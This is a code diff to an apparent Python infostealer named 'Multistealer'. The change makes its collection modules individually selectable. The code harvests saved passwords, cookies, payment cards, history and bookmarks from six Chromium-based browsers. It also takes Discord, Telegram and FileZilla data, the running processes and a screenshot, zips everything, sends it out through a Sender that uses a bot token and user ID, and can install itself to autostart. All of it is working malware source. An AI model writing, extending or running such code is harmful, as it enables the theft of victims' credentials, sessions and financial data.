@@ -3,29 +3,30 @@ from shutil import rmtree
 from threading import Thread
 from os import path, makedirs
 
-from .modules import Chromium, Discord, FileZilla, System, Telegram
+from .modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
 from .utils import Autostart, config, Sender
+from .enums import Features, Utils
 
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
+    def __init__(self, token: str, user_id: int, modules: list = [Features.all], utils: list = []):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
         self.user_id = user_id
-        self.errors = errors
-        self.autostart = autostart
+        self.errors = True if Utils.errors in utils else False
+        self.autostart = True if Utils.autostart in utils else False
 
         self.config = config.MultistealerConfig()
 
-        for status in self.config.Functions:
-            if status in kwargs:
-                self.__dict__.update({status: kwargs[status]})
-            else:
-                self.__dict__.update({status: True})
-
-        browser_functions = (self.passwords, self.cookies, self.cards, self.history, self.bookmarks)
+        browser_functions = [module for module in [
+            Features.passwords,
+            Features.cookies,
+            Features.cards,
+            Features.history,
+            Features.bookmarks
+        ] if module in modules or Features.all in modules]
 
         self.methods = [
             {
@@ -35,7 +36,8 @@ class Stealer(Thread):
                     *self.config.ChromePaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": Chromium(
@@ -44,7 +46,8 @@ class Stealer(Thread):
                     *self.config.OperaGXPaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": Chromium(
@@ -53,7 +56,8 @@ class Stealer(Thread):
                     *self.config.OperaDefaultPaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": Chromium(
@@ -62,7 +66,8 @@ class Stealer(Thread):
                     *self.config.MicrosoftEdgePaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": Chromium(
@@ -71,7 +76,8 @@ class Stealer(Thread):
                     *self.config.BravePaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": Chromium(
@@ -80,39 +86,56 @@ class Stealer(Thread):
                     *self.config.VivaldiPaths,
                     browser_functions,
                     self.errors
-                )
+                ),
+                "status": True if len(browser_functions) > 0 else False
             },
             {
                 "object": System(
                     self.config.StoragePath,
                     "System",
-                    (self.screen, self.system, self.processes),
                     self.errors
-                )
+                ),
+                "status": True if (Features.system in modules or Features.all in modules) else False
+            },
+            {
+                "object": Processes(
+                    self.config.StoragePath,
+                    "System",
+                    self.errors
+                ),
+                "status": True if (Features.processes in modules or Features.all in modules) else False
+            },
+            {
+                "object": Screenshot(
+                    self.config.StoragePath,
+                    "System",
+                    self.errors
+                ),
+                "status": True if (Features.screenshot in modules or Features.all in modules) else False
             },
             {
                 "object": Discord(
                     self.config.StoragePath,
                     r"Programs\Discord",
-                    (self.discord,),
                     self.errors
-                )
+                ),
+                "status": True if (Features.discord in modules or Features.all in modules) else False
             },
             {
                 "object": Telegram(
                     self.config.StoragePath,
                     r"Programs\Telegram",
-                    (self.telegram,),
                     self.errors
-                )
+                ),
+                "status": True if (Features.telegram in modules or Features.all in modules) else False
             },
             {
                 "object": FileZilla(
                     self.config.StoragePath,
                     r"Programs\FileZilla",
-                    (self.filezilla,),
                     self.errors
-                )
+                ),
+                "status": True if (Features.filezilla in modules or Features.all in modules) else False
             }
         ]
 
@@ -131,13 +154,15 @@ class Stealer(Thread):
             self.__create_storage()
 
             for method in self.methods:
-                method["object"].start()
+                if method["status"] is True: method["object"].start()
 
             for method in self.methods:
-                method["object"].join()
+                if method["status"] is True: method["object"].join()
 
             Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
-            Autostart(argv[0], (self.autostart,), self.errors).run()
+
+            if self.autostart is True:
+                Autostart(argv[0], self.errors).run()
 
         except Exception as e:
             if self.errors is True: print(f"[Multistealer]: {repr(e)}")
